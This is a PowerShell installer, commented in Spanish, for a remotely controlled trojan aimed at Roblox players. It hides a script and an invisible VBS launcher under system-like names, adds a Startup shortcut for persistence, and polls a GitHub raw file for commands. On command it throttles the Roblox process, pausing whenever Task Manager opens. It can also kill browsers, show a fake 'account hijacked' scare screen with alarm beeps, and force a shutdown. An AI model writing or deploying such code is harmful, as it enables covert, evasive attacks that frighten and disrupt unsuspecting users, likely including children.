# --- CONFIGURACIÓN DE RUTAS ---
$dir = "$env:LOCALAPPDATA\WinSystem"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory }

$psFile = "$dir\TaskHostWin.ps1"
$vbsFile = "$dir\Launcher.vbs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"

# --- 1. MOTOR DE CONTROL (TaskHostWin.ps1) ---
# Usamos comillas simples @' '@ para evitar errores de caracteres especiales
$psContent = @'
$controlUrl = "https://raw.githubusercontent.com/polgatiz/lox/main/control.txt"
$windowTitle = "*Roblox*"

function MostrarHacker($l1, $l2) {
    $ascii = @"
                .........................
             .:iiiiiiiiiiiiiiiiiiiiiiiiii:.
           :iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii:
         :iii      iiiiiiiiiiiiiiii      iii:
        iiii   ---  iiiiiiiiiiiiii  ---   iiii
       iiii   | X |  iiiiiiiiiiii  | X |   iiii
       iiii    ---  iiiiiiiiiiiiii   ---    iiii
       iiii        iiiiiiiiiiiiiiii        iiii
       iiiiiiiiiiiiiiiiii    iiiiiiiiiiiiiiiiii
        iiiiiiiiiiiiiiii      iiiiiiiiiiiiiiii
         iiiiiiiiiiiii  XXXXXX  iiiiiiiiiiiii
          iiiiiiiiiiii  XXXXXX  iiiiiiiiiiii
            iiiiiiiiii          iiiiiiiiii
              iiiiiiiiiiiiiiiiiiiiiiiiii
      [ALERTA DE SEGURIDAD: CUENTA COMPROMETIDA]
      ------------------------------------------
      INICIANDO SECUESTRO DE CUENTA ROBLOX...
      EXTRAYENDO COOKIES DE SESION........... [OK]
      CAMBIANDO CONTRASEÑA Y PIN............. [OK]
      VACIANDO INVENTARIO DE ITEMS........... [OK]
      $l1
      $l2
      ------------------------------------------
      ESTADO: TRANSFERENCIA EN CURSO (94%)
"@
    $pathS = "$env:TEMP\syserr.ps1"
    $c = "$Host.UI.RawUI.BackgroundColor='Black';$Host.UI.RawUI.ForegroundColor='Red';Clear-Host;Write-Host '$ascii';for(`$i=0;`$i -lt 10;`$i++){[Console]::Beep(200,150);[Console]::Beep(100,150)};Read-Host 'ERROR DE CONEXION: LA CUENTA NO PUEDE SER RECUPERADA'"
    Set-Content -Path $pathS -Value $c -Force
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass", "-File", "`"$pathS`"" -WindowStyle Maximized
}

try { 
    $api = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("ntdll.dll")] public static extern uint NtSuspendProcess(IntPtr h);
        [DllImport("ntdll.dll")] public static extern uint NtResumeProcess(IntPtr h);
    }
"@
    Add-Type -TypeDefinition $api -ErrorAction SilentlyContinue 
} catch {}

while($true) {
    try {
        $raw = (Invoke-WebRequest -Uri $controlUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content.Trim()
        $partes = $raw -split '\|'
        $comando = $partes[0]
    } catch { $comando = "OFF" }

    if ($comando -eq "OFF") { Start-Sleep -Seconds 30; continue }

    $roblox = Get-Process | Where-Object { $_.MainWindowTitle -like $windowTitle }
    if ($roblox) {
        $h = $roblox[0].Handle
        $TargetID = $roblox[0].Id
        switch ($comando) {
            "MSG" {
                $m = if($partes.Count -gt 1){$partes[1]}else{"Aviso"}
                (New-Object -ComObject WScript.Shell).Popup($m, 0, "Windows System", 64)
            }
            "HACK" {
                Get-Process chrome, msedge, firefox -ErrorAction SilentlyContinue | Stop-Process -Force
                $m1 = if($partes.Count -gt 1){$partes[1]}else{"SISTEMA SECUESTRADO"}
                $m2 = if($partes.Count -gt 2){$partes[2]}else{"APAGADO EN 60S"}
                MostrarHacker $m1 $m2
                shutdown.exe /s /t 60 /c "Violacion de seguridad detectada."
            }
        }
        $step = 1
        while (Get-Process -Id $TargetID -ErrorAction SilentlyContinue) {
            if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) {
                [Win32]::NtResumeProcess($h); Start-Sleep -Seconds 5; continue
            }
            $ints = if($comando -eq "HACK"){ 99 } else { [math]::Min(98, ($step / 300) * 98) }
            [Win32]::NtSuspendProcess($h); Start-Sleep -Milliseconds $ints
            [Win32]::NtResumeProcess($h); Start-Sleep -Milliseconds (100 - $ints)
            $step++
        }
    }
    Start-Sleep -Seconds 15
}
'@

# --- 2. LANZADOR INVISIBLE (Launcher.vbs) ---
$vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")" + [char]10 + "WshShell.Run `"powershell.exe -ExecutionPolicy Bypass -File `"`"$psFile`"`"`", 0, False"

# --- 3. GUARDAR Y CONFIGURAR ---
Set-Content -Path $psFile -Value $psContent -Force
Set-Content -Path $vbsFile -Value $vbsContent -Force

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($startupPath)
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = "`"$vbsFile`""
$Shortcut.Save()

Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`""
